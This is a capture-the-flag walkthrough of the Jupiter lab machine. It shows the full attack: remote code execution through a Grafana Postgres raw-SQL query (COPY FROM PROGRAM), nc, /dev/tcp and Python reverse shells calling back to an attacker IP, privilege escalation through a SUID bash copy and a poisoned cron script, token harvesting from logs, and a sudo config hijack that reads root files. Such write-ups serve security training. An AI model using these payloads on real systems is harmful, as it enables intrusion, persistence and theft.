# nmap
```
# Nmap 7.93 scan initiated Sun Oct  1 09:51:00 2023 as: nmap -p- -Pn -sC -sV -T4 -oN nmap.txt -vvvv 10.10.11.216
Increasing send delay for 10.10.11.216 from 5 to 10 due to 27 out of 66 dropped probes since last increase.
Warning: 10.10.11.216 giving up on port because retransmission cap hit (6).
Nmap scan report for jupiter.htb (10.10.11.216)
Host is up, received user-set (0.33s latency).
Scanned at 2023-10-01 09:51:01 EDT for 2910s
Not shown: 65412 closed tcp ports (conn-refused)
PORT      STATE    SERVICE        REASON      VERSION
22/tcp    open     ssh            syn-ack     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ac5bbe792dc97a00ed9ae62b2d0e9b32 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEJSyKmXs5CCnonRCBuHkCBcdQ54oZCUcnlsey3u2/vMXACoH79dGbOmIHBTG7/GmSI/j031yFmdOL+652mKGUI=
|   256 6001d7db927b13f0ba20c6c900a71b41 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHhClp0ailXIfO0/6yw9M1pRcZ0ZeOmPx22sO476W4lQ
80/tcp    open     http           syn-ack     nginx 1.18.0 (Ubuntu)
|_http-title: Home | Jupiter
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
```

# VHost Enumeration
Using ```ffuf```, we are able to find a VHost belonging to jupiter.htb

```
┌──(kali㉿kali)-[~/Desktop/jupiter]
└─$ ffuf -u "http://jupiter.htb" -H 'Host: FUZZ.jupiter.htb' -w subdomains-trickest-inventory.txt -fs 178

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://jupiter.htb
 :: Wordlist         : FUZZ: subdomains-trickest-inventory.txt
 :: Header           : Host: FUZZ.jupiter.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

kiosk                   [Status: 200, Size: 34390, Words: 2150, Lines: 212, Duration: 271ms]
```

We will then add this to our ```/etc/hosts``` file

```
10.10.11.216 jupiter.htb kiosk.jupiter.htb
```

# Remote Code Execution on /api/ds/query endpoint
Intercepting the request that is being made when we visit http://kiosk.jupiter.htb, we are able to intercept a POST request to ```/api/ds/query``` that executes a raw SQL query to the postgres database

```
POST /api/ds/query HTTP/1.1
Host: kiosk.jupiter.htb
Content-Length: 484
x-plugin-id: postgres
x-grafana-org-id: 1
x-panel-id: 24
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
content-type: application/json
accept: application/json, text/plain, */*
x-dashboard-uid: jMgFGfA4z
x-datasource-uid: YItSLg-Vz
Origin: http://kiosk.jupiter.htb
Referer: http://kiosk.jupiter.htb/d/jMgFGfA4z/moons?orgId=1&refresh=1d
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"queies":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"select \n  name as \"Name\", \n  parent as \"Parent Planet\", \n  meaning as \"Name Meaning\" \nfrom \n  moons \nwhere \n  parent = 'Saturn' \norder by \n  name desc;","format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":839}],"range":{"from":"2023-10-04T10:21:07.326Z","to":"2023-10-04T16:21:07.326Z","raw":{"from":"now-6h","to":"now"}},"from":"1696414867326","to":"1696436467326"}
```

Since we know that this is a postgres database, we will be able to execute remote code exeution via the raw sql query

```
POST /api/ds/query HTTP/1.1
Host: kiosk.jupiter.htb
Content-Length: 444
x-plugin-id: postgres
x-grafana-org-id: 1
x-panel-id: 24
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
content-type: application/json
accept: application/json, text/plain, */*
x-dashboard-uid: jMgFGfA4z
x-datasource-uid: YItSLg-Vz
Origin: http://kiosk.jupiter.htb
Referer: http://kiosk.jupiter.htb/d/jMgFGfA4z/moons?orgId=1&refresh=1d
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec from PROGRAM 'id';SELECT * FROM cmd_exec;","format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":839}],"range":{"from":"2023-10-04T10:21:07.326Z","to":"2023-10-04T16:21:07.326Z","raw":{"from":"now-6h","to":"now"}},"from":"1696414867326","to":"1696436467326"}
```

Afterwards, we can spawn a reverse shell connection to our local listener by sending the following requests

```
POST /api/ds/query HTTP/1.1
Host: kiosk.jupiter.htb
Content-Length: 504
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
content-type: application/json
accept: application/json, text/plain, */*
Origin: http://kiosk.jupiter.htb
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"queries":[{"refId":"","datasource":{"type":"postgres","uid":""},"rawSql":"DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec from PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.4 4000 >/tmp/f';SELECT * FROM cmd_exec;","format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":839}],"range":{"from":"2023-10-04T10:21:07.326Z","to":"2023-10-04T16:21:07.326Z","raw":{"from":"now-6h","to":"now"}},"from":"1696414867326","to":"1696436467326"}
```

However, we notice that this reverse shell connection is unstable and quickly times out which will break our connection. In order to make this connection more stable, we will execute another reverse shell connection upon obtaining our first reverse shell

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4000
listening on [any] 4000 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.11.216] 35648
sh: 0: can't access tty; job control turned off
$ /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.4/3000 0>&1'
```

# Privilege Escalation to juno
Using pspy, we can find that there is a background process thate executes /dev/shm/network-simulation.yml

```
2023/10/05 03:10:02 CMD: UID=1000  PID=32551  | /bin/bash /home/juno/shadow-simulation.sh 
2023/10/05 03:10:02 CMD: UID=1000  PID=32552  | rm -rf /dev/shm/shadow.data 
2023/10/05 03:10:02 CMD: UID=1000  PID=32553  | /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml 
2023/10/05 03:10:02 CMD: UID=1000  PID=32556  | /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml 
2023/10/05 03:10:02 CMD: UID=1000  PID=32557  | 
2023/10/05 03:10:02 CMD: UID=1000  PID=32562  | /usr/bin/python3 -m http.server 80 
2023/10/05 03:10:02 CMD: UID=1000  PID=32563  | /usr/bin/curl -s server 
2023/10/05 03:10:02 CMD: UID=1000  PID=32565  | /usr/bin/curl -s server 
2023/10/05 03:10:02 CMD: UID=1000  PID=32567  | /usr/bin/curl -s server 
2023/10/05 03:10:02 CMD: UID=1000  PID=32572  | cp -a /home/juno/shadow/examples/http-server/network-simulation.yml /dev/shm/
```

Examining the /dev/shm/network-simulation.yml file, we can see that this file will execute ```python3 -m http.server 80``` and ```curl -s server```

```
general:
  # stop after 10 simulated seconds
  stop_time: 10s
  # old versions of cURL use a busy loop, so to avoid spinning in this busy
  # loop indefinitely, we add a system call latency to advance the simulated
  # time when running non-blocking system calls
  model_unblocked_syscall_latency: true

network:
  graph:
    # use a built-in network graph containing
    # a single vertex with a bandwidth of 1 Gbit
    type: 1_gbit_switch

hosts:
  # a host with the hostname 'server'
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/python3
      args: -m http.server 80
      start_time: 3s
  # three hosts with hostnames 'client1', 'client2', and 'client3'
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/curl
      args: -s server
      start_time: 5s
```

Checking the permissions of the file, we also notice that we are able to write to the file as well

```
postgres@jupiter:/dev/shm$ ls -la network-simulation.yml
ls -la network-simulation.yml
-rw-rw-rw- 1 juno juno 815 Mar  7  2023 network-simulation.yml
```

When I tried to modify the network-simulation.yml file to spawn a reverse shell connection, it seemed that it was unable to do so. Hence, I will be copying a bash shell to the /tmp directory and elevating it with SUID privileges so that I can obtain a bash shell with the privileges of juno. 

```
general:
  # stop after 10 simulated seconds
  stop_time: 10s
  # old versions of cURL use a busy loop, so to avoid spinning in this busy
  # loop indefinitely, we add a system call latency to advance the simulated
  # time when running non-blocking system calls
  model_unblocked_syscall_latency: true

network:
  graph:
    # use a built-in network graph containing
    # a single vertex with a bandwidth of 1 Gbit
    type: 1_gbit_switch

hosts:
  # a host with the hostname 'server'
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/cp
      args: /bin/bash /tmp/exploit
      start_time: 3s
  # three hosts with hostnames 'client1', 'client2', and 'client3'
  client:
    network_node_id: 0
    quantity: 3                                                                                                
    processes:
    - path: /usr/bin/chmod
      args: u+s /tmp/exploit
      start_time: 5s
```

Executing /tmp/exploit, will then give us a shell with the permissions of juno

```
postgres@jupiter:/tmp$ ./exploit -p
./exploit -p
id
uid=114(postgres) gid=120(postgres) euid=1000(juno) groups=120(postgres),119(ssl-cert)
```

However, we still do not have the privileges to view the user.txt file. Examining the privileges of the file, we realize that we have to be in the juno group to be able to view the file. However, our current group is the postgres group as the shell is inherited from the previous session. In order to get the juno group, we would have to start a new session instead

```
cd /home/juno
cat user.txt
cat: user.txt: Permission denied
```

However, we also realize that the following script ```/home/juno/shadow-simulation.sh``` will be executed. Hence, we can add our reverse shell command to /home/juno/shadow-simulation.sh to spawn a new reverse shell command as juno

```
echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.4/4000 0>&1'" >> /home/juno/shadow-simulation.sh
cat /home/juno/shadow-simulation.sh
#!/bin/bash
cd /dev/shm
rm -rf /dev/shm/shadow.data
/home/juno/.local/bin/shadow /dev/shm/*.yml
cp -a /home/juno/shadow/examples/http-server/network-simulation.yml /dev/shm/
/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.4/4000 0>&1'
```
# Obtaining user flag

```
juno@jupiter:~$ cat user.txt
cat user.txt
<user flag>
```

# Alternative privilege escalation for Jovian
Using linpeas, we notice that port 8888 is open on the localhost

```
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                  
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                              
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

Using the curl command, we can see that port 8888 is hosting a Jupyter notebook

```
juno@jupiter:/tmp$ curl -ikL http://localhost:8888
HTTP/1.1 302 Found
Server: TornadoServer/6.2
Content-Type: text/html; charset=UTF-8
Date: Thu, 05 Oct 2023 08:59:09 GMT
Location: /tree?
Content-Length: 0

HTTP/1.1 302 Found
Server: TornadoServer/6.2
Content-Type: text/html; charset=UTF-8
Date: Thu, 05 Oct 2023 08:59:09 GMT
X-Content-Type-Options: nosniff
Content-Security-Policy: frame-ancestors 'self'; report-uri /api/security/csp-report
Location: /login?next=%2Ftree
Content-Length: 0

HTTP/1.1 200 OK
Server: TornadoServer/6.2
Content-Type: text/html; charset=UTF-8
Date: Thu, 05 Oct 2023 08:59:09 GMT
X-Content-Type-Options: nosniff
Content-Security-Policy: frame-ancestors 'self'; report-uri /api/security/csp-report
Etag: "b1f7597395ab69ba03735137c697c3988ee6feab"
Content-Length: 12371
Set-Cookie: _xsrf=2|22ac6f2d|669b457e5fe517e92cdb6e5613d13ecb|1696496349; Path=/

<!DOCTYPE HTML>
<html>

<head>
    <meta charset="utf-8">

    <title>Jupyter Notebook</title>
...
```

We will use chisel to forward port 8888 on the target machine to our local machine. However, we realize that we would require the Jupyterhub's token in order to access Jupyterhub. In /opt/solar-flares/logs, we are able to access all the logs of Jupyterhub and we are also able to obtain the multiple token for Jupyterhub. Testting each token, we are finally able to obtain the valid token to authenticate to Jupyterhub.

```
juno@jupiter:/opt/solar-flares/logs$ cat *.log | grep token=
...
[I 13:53:10.516 NotebookApp]  or http://127.0.0.1:8888/?token=99515a46ec9771332b4bdb8c6345f556d0b9033ebb857bfc
     or http://127.0.0.1:8888/?token=99515a46ec9771332b4bdb8c6345f556d0b9033ebb857bfc
[I 20:39:52.954 NotebookApp]  or http://127.0.0.1:8888/?token=17c88cd08da0e83060212d9bdca9b7e0cb77a5b3db7f601e
     or http://127.0.0.1:8888/?token=17c88cd08da0e83060212d9bdca9b7e0cb77a5b3db7f601e
[I 14:05:51.514 NotebookApp]  or http://127.0.0.1:8888/?token=6e55453452553edb56a9a1ff047e59731a996f1b1477a2bb
     or http://127.0.0.1:8888/?token=6e55453452553edb56a9a1ff047e59731a996f1b1477a2bb
[I 04:26:13.071 NotebookApp]  or http://127.0.0.1:8888/?token=ef4fb5130d8b5a2617a9094d8ae174122871944b0409ccc6
     or http://127.0.0.1:8888/?token=ef4fb5130d8b5a2617a9094d8ae174122871944b0409ccc6
```

After gaining access to the Jupyterhub site, we are also able to gain access to the Jupyter notebooks at http://127.0.0.1:8888/notebooks/flares.ipynb. We are then able to execute code in the Jupyter NoteBook. From there, we can insert a reverse shell code and execute it to gain a reverse shell connection to local listener

```
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.4",4000))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
```

Since the Jupyter NoteBook is being executed with the permissions of jovian, we are able to escalate our privileges to become jovian

```
juno@jupiter:/opt/solar-flares$ ps -aux | grep jovian
ps -aux | grep solar
jovian      1178  0.0  2.2 474480 91384 ?        Sl   04:26   0:02 /usr/bin/python3 /usr/local/bin/jupyter-notebook --no-browser /opt/solar-flares/flares.ipynb
```

# Privilege Escalation to root
Using ```sudo -l```, we are able to find that the user can execute ```/usr/local/bin/sattrack``` with root permissions

```
jovian@jupiter:/usr/local/share/sattrack$ do -l
sudo -l
Matching Defaults entries for jovian on jupiter:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User jovian may run the following commands on jupiter:
    (ALL) NOPASSWD: /usr/local/bin/sattrack

```

However, when we execute sattrack, we realize that we are given an error message that says that the configuration file is not found

```
jovian@jupiter:/usr/local/share/sattrack$ /usr/local/bin/sattrack
/usr/local/bin/sattrack
Satellite Tracking System
Configuration file has not been found. Please try again!
```

Afterwards, we are also able to find the folder containing sattrack files in /usr/local/share/sattrack

```
jovian@jupiter:/usr/local/share/sattrack$ find / -name "*sattrack*" 2>/dev/null
find / -name "*sattrack*" 2>/dev/null
/usr/local/share/sattrack
/usr/local/bin/sattrack
```

In /usr/local/share/sattrack, we are able to find a config.json file. This should be the configuration file that is used for /usr/local/bin/sattrack

```
jovian@jupiter:/usr/local/share/sattrack$ cat config.json
cat config.json
{
 "tleroot": "/tmp/tle/",
 "tlefile": "weather.txt",
 "mapfile": "/usr/local/share/sattrack/map.json",
 "texturefile": "/usr/local/share/sattrack/earth.png",

 "tlesources": [
  "http://celestrak.org/NORAD/elements/weather.txt",
  "http://celestrak.org/NORAD/elements/noaa.txt",
  "http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&FORMAT=tle"
 ],

 "updatePerdiod": 1000,

 "station": {
  "name": "LORCA",
  "lat": 37.6725,
  "lon": -1.5863,
  "hgt": 335.0
 },

 "show": [
 ],

 "columns": [
  "name",
  "azel",
  "dis",
  "geo",
  "tab",
  "pos",
  "vel"
 ]
}
```
Using the strings command, we are also able to obtain the configuration file at /tmp/config.json

```
jovian@jupiter:/usr/local/share/sattrack$ strings /usr/local/bin/sattrack | grep config
strings /usr/local/bin/sattrack | grep config
/tmp/config.json
tleroot not defined in config
updatePerdiod not defined in config
station not defined in config
name not defined in config
lat not defined in config
lon not defined in config
hgt not defined in config
mapfile not defined in config
texturefile not defined in config
tlefile not defined in config
su_lib_log_config
_GLOBAL__sub_I__Z6configB5cxx11
```

After moving the config.json file to /tmp, we are now able to execute /usr/local/bin/sattrack. We realize that this binary will attempt to obtain the files from the ```tlesources``` in the config file. 

```
jovian@jupiter:/usr/local/share/sattrack$ /usr/local/bin/sattrack
/usr/local/bin/sattrack
Satellite Tracking System
tleroot does not exist, creating it: /tmp/tle/
Get:0 http://celestrak.org/NORAD/elements/weather.txt
Could not resolve host: celestrak.org
Get:0 http://celestrak.org/NORAD/elements/noaa.txt
Could not resolve host: celestrak.org
Get:0 http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&FORMAT=tle
Could not resolve host: celestrak.org
Satellites loaded
No sats
```

Since we know that the binary will fetch files from a server, we can hijack the ```tlesources``` to make the binary fetch files from the local server instead by modifying the config.json file 

```
{
 "tleroot": "/tmp/tle/",
 "tlefile": "weather.txt",
 "mapfile": "/usr/local/share/sattrack/map.json",
 "texturefile": "/usr/local/share/sattrack/earth.png",

 "tlesources": [
  "file:///root/root.txt",
  "http://celestrak.org/NORAD/elements/noaa.txt",
  "http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&FORMAT=tle"
 ],

 "updatePerdiod": 1000,

 "station": {
  "name": "LORCA",
  "lat": 37.6725,
  "lon": -1.5863,
  "hgt": 335.0
 },

 "show": [
 ],

 "columns": [
  "name",
  "azel",
  "dis",
  "geo",
  "tab",
  "pos",
  "vel"
 ]
}

```

# Obtaining root flag
Finally, executing the binary will then give us the root flag

```
jovian@jupiter:/opt/solar-flares$ sudo /usr/local/bin/sattrack
sudo /usr/local/bin/sattrack
Satellite Tracking System
Get:0 file:///root/root.txt
Get:1 http://celestrak.org/NORAD/elements/noaa.txt
Could not resolve host: celestrak.org
Get:1 http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&FORMAT=tle
Could not resolve host: celestrak.org
tlefile is not a valid file
jovian@jupiter:/opt/solar-flares$ cat /tmp/tle/root.txt
cat /tmp/tle/root.txt
<root flag>
```
# Alternative privilege escalation for Juno
An alternative way of escalating privilege for Juno would be to add our own private key to /home/juno/.ssh/authorized_keys.

```
juno@jupiter:~/.ssh$ echo "<public key>" >> authorized_keys
```

Afterwards, we can use our own private key to get access as juno user.
